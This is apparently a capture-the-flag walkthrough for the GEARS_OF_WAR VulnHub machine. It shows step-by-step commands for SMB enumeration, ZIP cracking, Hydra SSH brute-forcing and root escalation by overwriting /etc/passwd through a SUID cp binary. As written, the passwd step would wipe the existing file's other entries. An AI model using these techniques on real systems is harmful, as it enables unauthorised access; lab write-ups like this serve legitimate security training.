---
title: "GEARS_OF_WAR — VulnHub Walkthrough"
description: "Rooting GEARS_OF_WAR through SMB enumeration to a root shell."
date: 2024-03-10
category: offensive
readTime: "10 min read"
mitre:
  - "T1110"
  - "T1068"
tags:
  - "VulnHub"
  - "SMB"
  - "SUID"
  - "Caesar Cipher"
  - "Crunch"
  - "Privilege Escalation"
  - "CTF"
summary: "Rooting GEARS_OF_WAR through SMB enumeration to a root shell."
---

**Machine:** GEARS_OF_WAR (EP#1)
**Difficulty:** Intermediate
**Key Techniques:** SMB enumeration, ZIP password cracking, Caesar cipher, SSH key extraction, SUID privilege escalation

---

## Enumeration

### Port Scanning

```bash
nmap -v -T4 -sC -sV 192.168.56.118
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.29 (Ubuntu) |
| 139 | NetBIOS | Samba 3.x–4.x |
| 445 | SMB | Samba 4.7.6 (Ubuntu) |

The host was identified as `GEARS_OF_WAR` running on a VirtualBox virtual NIC.

### SMB Enumeration

```bash
smbclient -L 192.168.56.118
```

Discovered share: `LOCUS_LAN$` (with comment "LOCUST FATHER")

```bash
smbclient //192.168.56.118/LOCUS_LAN$
```

Downloaded two files from the share:

```
msg_horda.zip    (332 bytes)
SOS.txt          (198 bytes)
```

### Analyzing SOS.txt

```
This is a message for the Delta Team.

I found a file that contains a password to free ........ oh no they here!!!!!!!!!!,
i must protect myself, please try to get the password!!

[@%%,]

-Hoffman.
```

The characters `[@%%,]` are a **crunch pattern** — they define the charset for password generation:
- `@` = lowercase letters
- `%` = digits
- `,` = special characters

### Cracking the ZIP File

```bash
# Generate wordlist using crunch pattern from SOS.txt
crunch 4 4 -t @%%, -o wordlist

# Crack the ZIP
fcrackzip -D -u -v -p wordlist msg_horda.zip
```

**ZIP Password:** `r44M`

Inside the ZIP: a `key.txt` file containing the password `3_d4y`.

### robots.txt Discovery

The web server on port 80 had a `robots.txt` revealing hidden paths:

```
/marcus.html
/dom.html
/cole.html
/baird.html
/acarmine.html
```

Each name had a corresponding ROT-13 encoded counterpart:

```
marcus → __znephf
dom → qbz
cole → pbyr
baird → onveq
```

These encoded names mapped to additional pages on the server.

---

## Exploitation

### SSH Access

Using the password `3_d4y` from the cracked ZIP, brute-forced the SSH username:

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p 3_d4y -T4 192.168.56.118 ssh
```

**Username:** `marcus`

```bash
ssh marcus@192.168.56.118
# Password: 3_d4y
```

---

## Privilege Escalation

### SUID Binary Abuse

After gaining SSH access, enumerated SUID binaries:

```bash
find /bin -type f -perm -u=s 2>/dev/null
```

Found: `cp` has the SUID bit set — this allows copying arbitrary files as root.

### /etc/passwd Injection

The classic privilege escalation technique:

```bash
# Generate a password hash
openssl passwd -1 -salt raj pass123

# Create a new root user entry
echo 'raj:$1$raj$<hash>:0:0::/root:/bin/bash' > /tmp/passwd

# Overwrite /etc/passwd using SUID cp
cp /tmp/passwd /etc/passwd

# Switch to the new root user
su raj
# Password: pass123
```

Now running as root.

---

## Lessons Learned

1. **SMB shares often contain sensitive files** — always enumerate and download everything.
2. **Crunch patterns in notes** — the `[@%%,]` pattern in SOS.txt was a direct hint for password generation.
3. **Caesar/ROT-13 ciphers** are common in beginner CTFs — quick to decode with `tr` or CyberChef.
4. **SUID `cp` is a well-known escalation vector** — always check for writable SUID binaries.
